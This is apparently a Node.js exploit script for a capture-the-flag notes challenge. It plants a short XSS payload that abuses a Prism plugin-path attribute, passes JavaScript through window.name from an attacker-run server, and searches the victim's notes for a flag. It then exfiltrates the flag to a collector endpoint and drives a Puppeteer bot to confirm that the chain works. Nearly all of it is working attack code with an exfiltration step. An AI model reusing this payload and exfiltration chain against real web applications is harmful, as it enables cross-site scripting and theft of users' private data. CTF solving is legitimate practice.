const path = require("path");
const http = require("http");
const fs = require("fs");
const puppeteer = require(path.resolve(__dirname, "../challenge_mouse/bot/node_modules/puppeteer-core"));

const APP = "http://127.0.0.1:3000";
const ATKHOST = "127.0.0.1";
const ATKPORT = 8000;
const EXFIL = `http://${ATKHOST}:${ATKPORT}/c?f=`;   // final hop target
const CHROME = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";

// ---------- payload (<= 80) ----------
const body = "<a data-prism-plugins data-prism-plugin-path=data:text/javascript,import(name)#>";
console.log("[*] payload len:", body.length);

// ---------- FULLCODE executed inside the sandboxed note page ----------
const FULLCODE = `
const o=location.origin;
const html=async u=>(await fetch(u,{cache:'force-cache'})).text();
(async()=>{
 const ex=(f)=>{try{history.replaceState(null,'','/')}catch(e){}
   location.href=${JSON.stringify(EXFIL)}+encodeURIComponent(f)};
 try{
  const t=await html(o+'/notes/?search=');
  const ids=[...t.matchAll(/href="\/notes\/([a-f0-9]{8})"/g)].map(m=>m[1]);
  for(const id of ids){
   try{
    const p=await html(o+'/notes/'+id);
    if(p.includes('flag draft')){
     const flag=(p.match(/<main>([\\s\\S]*?)<\\/main>/)||[])[1]||p;
     ex(flag.trim());return;
    }
   }catch(e){}
  }
  ex('NOTFOUND');
 }catch(e){ex('ERR:'+e.message)}
})();
`.trim();

// ---------- attacker + collector server ----------
const notes = [];
const server = http.createServer((req, res) => {
  const u = req.url;
  console.log("[SRV]", req.method, u);
  notes.push(u);
  if (u.startsWith("/atk")) {
    res.setHeader("Content-Type", "text/html");
    const nid = decodeURIComponent((u.split("?n=")[1] || "").split("&")[0]);
    const data = "data:text/javascript," + encodeURIComponent(FULLCODE);
    res.end(`<!doctype html><html><body>
<script>
var w=window.open(${JSON.stringify(APP + "/notes/?search=")});
window.name=${JSON.stringify(data)};
setTimeout(function(){location.href=${JSON.stringify(APP + "/notes/")}+${JSON.stringify(nid)}},600);
</script></body></html>`);
    return;
  }
  if (u.startsWith("/c")) {
    fs.appendFileSync("flag_local.txt", decodeURIComponent(u) + "\n");
    console.log("[FLAG-LOCAL]", decodeURIComponent(u));
    res.end("ok");
    return;
  }
  if (u.startsWith("/code")) { res.end(FULLCODE); return; }
  res.end("ok");
});

server.listen(ATKPORT, ATKHOST, async () => {
  // create note
  const postData = "title=hi&body=" + encodeURIComponent(body);
  const noteId = await new Promise((resolve, reject) => {
    const req = http.request(APP + "/notes", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": Buffer.byteLength(postData),
        "Sec-Fetch-Mode": "navigate"
      }
    }, res => resolve((res.headers.location || "").split("/").pop()));
    req.on("error", reject);
    req.write(postData);
    req.end();
  });
  console.log("[+] note:", noteId);

  const browser = await puppeteer.launch({
    headless: "new", executablePath: CHROME,
    args: ["--no-sandbox", "--disable-dev-shm-usage", "--js-flags=--jitless", "--no-default-browser-check"]
  });
  const page = await browser.newPage();
  page.on("console", m => console.log("[CONSOLE]", m.text()));
  page.on("requestfailed", r => console.log("[REQFAIL]", r.url()));
  page.on("response", r => { if (r.url().includes("127.0.0.1:3000")) console.log("[RESP]", r.status(), r.url()); });

  await page.setRequestInterception(true);
  page.on("request", request => {
    const externalNavigation = page.url().startsWith(`${APP}/notes/`)
      && request.isNavigationRequest()
      && request.frame() === page.mainFrame()
      && new URL(request.url()).origin !== APP;
    externalNavigation ? request.abort() : request.continue();
  });

  await page.setExtraHTTPHeaders({ "X-Bot-Token": "bot-token" });
  await page.goto(`${APP}/bot/session`, { waitUntil: "domcontentloaded" });
  await page.setExtraHTTPHeaders({});

  console.log("[*] bot visiting /atk");
  await page.goto(`http://${ATKHOST}:${ATKPORT}/atk?n=${noteId}`, { timeout: 5000, waitUntil: "domcontentloaded" });

  await new Promise(r => setTimeout(r, 20000));
  const got = notes.find(n => n.startsWith("/c"));
  console.log("[*] collector hits:", notes.filter(n => n.startsWith("/c")));
  await browser.close();
  server.close();
  process.exit(got ? 0 : 1);
});